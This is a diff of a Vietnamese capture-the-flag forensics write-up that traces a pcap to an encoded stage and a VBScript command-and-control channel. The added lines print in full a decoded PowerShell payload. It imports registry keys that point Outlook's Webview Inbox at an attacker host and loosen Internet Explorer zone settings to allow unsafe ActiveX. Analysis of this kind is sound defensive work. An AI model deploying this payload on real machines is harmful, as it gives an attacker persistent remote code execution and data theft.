@@ -22,20 +22,51 @@ Trích xuất file excel này và mở ra thì tìm được ô chứa câu lệ
 
 Mình có thử kiểm tra file Powershell nhưng không có gì, trong lúc tìm kiếm trong ổ đĩa thì có tìm được file `capture.pcapng` tại `C:\Users\BKISC\AppData\Desktop`.
 
-Extract `capture.pcapng` và sử dụng wireshark để phân tích. Do câu lệnh phía trên tải xuống từ `192.168.1.189:1704` nên mình tìm và extract object http theo địa chỉ này thì có được file `report.txt`. Nội dung bên trong được mã hóa base64. Giải mã thì đoạn mã thực hiện thay đổi registry key bảo cho phép thiết lập chạy ActiveX không an toàn và khiến Outlook tải xuống trang web từ `192.168.1.189:8386`
-![image](img5.png)
+Extract `capture.pcapng` và sử dụng wireshark để phân tích. Do câu lệnh phía trên tải xuống từ `192.168.1.189:1704` nên mình tìm và extract object http theo địa chỉ này thì có được file `report.txt`. Nội dung bên trong được mã hóa base64 và encode UTF-16LE . Giải mã thì đoạn mã thực hiện thay đổi registry key bảo cho phép thiết lập chạy ActiveX không an toàn và khiến Outlook tải xuống trang web từ `192.168.1.189:8386`
+```python
+$tempRegFile = [System.IO.Path]::GetTempFileName() + ".reg"
+
+$regContent = @"
+Windows Registry Editor Version 5.00
+
+[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\16.0\Outlook\Webview\Inbox]
+"url"="http://192.168.1.189:8386/plugin/search/"
+"security"="yes"
+
+[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\15.0\Outlook\Webview\Inbox]
+"url"="http://192.168.1.189:8386/plugin/search/"
+"security"="yes"
+
+[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\14.0\Outlook\Webview\Inbox]
+"url"="http://192.168.1.189:8386/plugin/search/"
+"security"="yes"
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Ext\Stats\{261B8CA9-3BAF-4BD0-B0C2-BF04286785C6}\iexplore]
+"Flags"=dword:00000004
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\2]
+"140C"=dword:00000000
+"1200"=dword:00000000
+"1201"=dword:00000003
+"@
+
+Set-Content -Path $tempRegFile -Value $regContent -Encoding Unicode
+& reg.exe import "`"$tempRegFile`""
+Remove-Item -Path $tempRegFile -Force
+
+```
 
 
 Sử dụng wireshark filter `tcp.port == 8386`. Follow stream 157 thì thấy được nội dung trang html để khai thác Outlook Webview và VBScript. Nó thực hiện thu thập thông tin, mã hóa và gửi về máy chủ tấn công. Thiết lập kênh liên lạc C2 bằng `MSXML2.ServerXMLHTTP` để gửi dữ liệu thông qua phương thức `POST`. Thay đổi registry key: thêm khóa "KEY" trong `UserInfo` và cập nhật lại URL của `Webview\Inbox`
-![image](img6.png)
+![image](img5.png)
 
 
 Follow stream 189 thì có những đoạn mã tải mã độc định kỳ và cơ chế thực thi lệnh từ xa. Thu thập giá trị của registry, thực hiện mã hóa XOR dữ liệu khi POST và GET. Cụ thể khi POST lên thì lấy dữ liệu XOR với "KEY" trong `UserInfo` đã thay đổi ở phía trên và chuyển thành hex
+![image](img6.png)
 ![image](img7.png)
-![image](img8.png)
 
 Quay lại `chall.ad1`, di chuyển đến `C:\Users\BKISC` để lấy file `NTUSER.DAT`, `ntuser.dat.LOG1` và `ntuser.dat.LOG2` để lấy registry key. Sử dụng RegistryExplorer để đọc giá trị "KEY": `o4WlfbKbx1xik1TgTQGeOQ`
-![image](img9.png)
+![image](img8.png)
 
 Dịch nội dung POST từ hex rồi XOR với KEY thì tìm được script python sau. Chạy thì lấy được flag
 ```python
